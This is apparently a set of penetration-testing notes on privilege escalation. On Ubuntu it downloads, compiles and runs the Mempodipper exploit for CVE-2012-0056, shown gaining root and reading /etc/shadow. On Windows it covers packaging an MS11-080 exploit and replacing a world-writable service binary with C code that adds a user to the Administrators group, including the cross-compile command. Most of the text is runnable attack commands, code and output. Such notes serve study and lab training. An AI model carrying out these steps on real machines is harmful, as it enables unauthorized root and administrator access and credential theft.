Privilege Escalation

Info: Increase the level of access to a machine or network


Scenario

Unix

SSH with normal user privileges and the machine is running Ubuntu 10.11, 32 bit (never been patched). Use Root Exploit which affects CVE 2012-0056

offsec@ubuntu:~$ id
uid=1000(offsec) gid=1000(offsec)
offsec@ubuntu:~$ cat /etc/shadow|grep root
cat: /etc/shadow: Permission denied
offsec@ubuntu:~$ wget -O exploit.c http://www.exploit-db.com/download/18411 
offsec@ubuntu:~$ gcc -o mempodipper exploit.c
offsec@ubuntu:~$ ./mempodipper
===============================
=
=
= ===============================
Mempodipper = by zx2c4 = Jan 21, 2012 =
[+] Waiting for transferred fd in parent.
[+] Executing child from child fork.
[+] Opening parent mem /proc/8810/mem in child. 
[+] Sending fd 3 to parent.
[+] Received fd at 5.
[+] Assigning fd 5 to stderr.
[+] Reading su for exit@plt.
[+] Resolved exit@plt to 0x8049520.
[+] Calculating su padding.
[+] Seeking to offset 0x8049514.
[+] Executing su with shellcode.
# id
uid=0(root) gid=0(root)
# cat /etc/shadow |grep root 
root:!:15806:0:99999:7:::


Windows

Priv-Esc via poor validation of input raised form user mode to windows kernel. This scenario overwrites arbritrary memory in kernel space. 

Info: MS11-080 Affects Windows XP and Windows 2003 (32 bit and 64 bit)

Commands

Create standalone executable as windows does not come with python pre-installed. Run the following in a lab environment to produce the executable. 

python pyinstaller.py --onefile ms11-080.py

Copy executable to machine and then run it


Priv-Esc via insecure file and service permissions 

Info: if file/servic permissions are not set properly, then it is possible to replace the file/service and run code with system level privileges.

Commands

Run icacls (windows utility that allows us to check for insecure permissions.

c:\Program Files\Photodex\ProShow Producer>icacls scsiaccess.exe 
scsiaccess.exe NT AUTHORITY\SYSTEM:(I)(F)
	•	BUILTIN\Administrators:(I)(F)
	•	BUILTIN\Users:(I)(RX)
	•	APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX) 
	•	Everyone:(I)(F) # Note that everyone has permission to the service. 
	•	
Create Windows Executable that will add a regular Windows user called 'low' to the local Administrators group. 

root@kali:~# cat useradd.c

#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main () 
{
	•	int i;
	•	i=system ("net localgroup administrators low /add"); 
	•	return 0;
}
	•	
Cross-compile with mingw


root@kali:~# i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c

Replace original scsiaccess.exe file with the one created and next time the service is started, our fake scsiaccess.exe file will be run with SYSTEM privileges and out user 'low' to the admin group. 



